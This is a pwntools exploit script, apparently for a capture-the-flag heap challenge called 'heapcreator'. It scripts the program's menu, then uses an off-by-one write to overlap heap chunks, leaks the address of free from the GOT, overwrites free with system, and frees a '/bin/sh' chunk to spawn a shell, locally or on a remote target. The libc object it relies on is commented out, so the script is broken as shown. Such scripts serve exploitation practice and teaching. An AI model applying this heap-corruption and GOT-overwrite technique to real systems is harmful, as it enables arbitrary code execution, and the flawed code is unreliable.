from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["",]
#libc=ELF('')
elf = ELF("./heapcreator")
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./heapcreator")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def create(size, content):
    ru(b":")
    sl(b'1')
    ru(b":")
    sl(str(size))
    ru(b":")
    sl(content)

def edit(idx, content):
    ru(b':')
    sl(b'2')
    ru(b':')
    sl(str(idx))
    ru(b':')
    sl(content)

def show(idx):
    ru(b':')
    sl(b'3')
    ru(b':')
    sl(str(idx))

def delete(idx):
    ru(b':')
    sl(b'4')
    ru(b':')
    sl(str(idx))


gdb.attach(p)
create(0x18,'stone')
create(0x18,'stone')

edit(0, b'/bin/sh\x00' + b'a' * 0x10 + b'\x41')
delete(1)

create(0x30, p64(0) * 3 + p64(0x21) + p64(0x30) + p64(elf.got['free']))
show(1)
ru(b'Content : ')
data = ru(b"Done !")

free_addr = u64(data.split(b"\n")[0].ljust(8,b'\x00'))
libc_base = free_addr - libc.sym['free']
pr('libc_base', libc_base)
system_addr = libc_base + libc.sym['system']
edit(1, p64(system_addr))
delete(0)

shell()